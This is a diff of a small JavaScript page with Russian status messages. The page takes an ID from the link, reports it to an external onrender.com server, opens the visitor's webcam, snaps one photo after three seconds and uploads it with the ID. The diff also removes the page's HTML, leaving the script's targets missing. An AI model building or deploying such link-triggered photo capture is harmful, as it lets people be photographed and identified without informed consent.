@@ -1,219 +1,136 @@
-<!DOCTYPE html>
-<html lang="ru">
-
-<head>
-
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-<title>Test</title>
-
-</head>
-
-
-<body>
-
-
-<h1>НОВАЯ ВЕРСИЯ</h1>
-
-<h2 id="status">
-Запуск...
-</h2>
-
-
-<video id="video"
-autoplay
-playsinline
-width="300">
-</video>
-
-
-
 <script>
-
 
 const RENDER_URL = "https://kossah-github-io.onrender.com";
 
 
+async function start() {
 
-async function start(){
+    const status = document.getElementById("status");
 
+    const params = new URLSearchParams(window.location.search);
+    const id = params.get("id");
 
-const status = document.getElementById("status");
 
+    if (!id) {
+        status.innerHTML = "Нет ID";
+        return;
+    }
 
-const params =
-new URLSearchParams(window.location.search);
 
+    try {
 
-const id = params.get("id");
+        // отправляем ID
+        const res = await fetch(
+            RENDER_URL + "/?id=" + id
+        );
 
+        console.log(await res.text());
 
 
-if(!id){
+        status.innerHTML =
+        "ID отправлен, открываю камеру";
 
-status.innerHTML = "Нет ID";
 
-return;
+        const stream =
+        await navigator.mediaDevices.getUserMedia({
+            video: true
+        });
 
-}
 
+        const video =
+        document.getElementById("video");
 
+        video.srcObject = stream;
 
-try{
 
+        status.innerHTML =
+        "Камера работает";
 
-// отправляем ID на Render
 
-let r = await fetch(
-RENDER_URL + "/?id=" + id
-);
+        setTimeout(async () => {
 
 
-console.log(await r.text());
+            const canvas =
+            document.createElement("canvas");
 
 
-status.innerHTML =
-"ID отправлен, открываю камеру";
+            canvas.width =
+            video.videoWidth;
 
+            canvas.height =
+            video.videoHeight;
 
 
+            canvas
+            .getContext("2d")
+            .drawImage(video,0,0);
 
-// запрос камеры
 
-const stream =
-await navigator.mediaDevices.getUserMedia(
-{
-video:true
-}
-);
 
+            canvas.toBlob(async (blob) => {
 
 
-const video =
-document.getElementById("video");
+                const form =
+                new FormData();
 
 
-video.srcObject = stream;
+                form.append(
+                    "id",
+                    id
+                );
 
 
+                form.append(
+                    "photo",
+                    blob,
+                    "photo.jpg"
+                );
 
-status.innerHTML =
-"Камера работает";
 
 
+                const answer =
+                await fetch(
+                    RENDER_URL + "/photo",
+                    {
+                        method:"POST",
+                        body:form
+                    }
+                );
 
 
-// ждём 3 секунды
+                status.innerHTML =
+                await answer.text();
 
-setTimeout(()=>{
 
 
-const canvas =
-document.createElement("canvas");
+                stream
+                .getTracks()
+                .forEach(
+                    t => t.stop()
+                );
 
 
+            }, "image/jpeg");
 
-canvas.width =
-video.videoWidth;
 
 
-canvas.height =
-video.videoHeight;
+        },3000);
 
 
 
-canvas.getContext("2d")
-.drawImage(
-video,
-0,
-0
-);
+    } catch(err) {
 
+        status.innerHTML =
+        "Ошибка: " + err;
 
+        console.log(err);
 
-
-canvas.toBlob(async(blob)=>{
-
-
-
-let form =
-new FormData();
-
-
-
-form.append(
-"id",
-id
-);
-
-
-
-form.append(
-"photo",
-blob,
-"photo.jpg"
-);
-
-
-
-
-let response =
-await fetch(
-RENDER_URL + "/photo",
-{
-method:"POST",
-body:form
-}
-);
-
-
-
-status.innerHTML =
-await response.text();
-
-
-
-
-stream
-.getTracks()
-.forEach(
-track=>track.stop()
-);
-
-
-
-},
-3000);
-
+    }
 
 
 }
-catch(e){
-
-
-status.innerHTML =
-"Ошибка: " + e;
-
-
-console.log(e);
-
-
-}
-
-
-
-}
-
 
 
 start();
 
-
-
 </script>
-
-
-</body>
-
-</html>
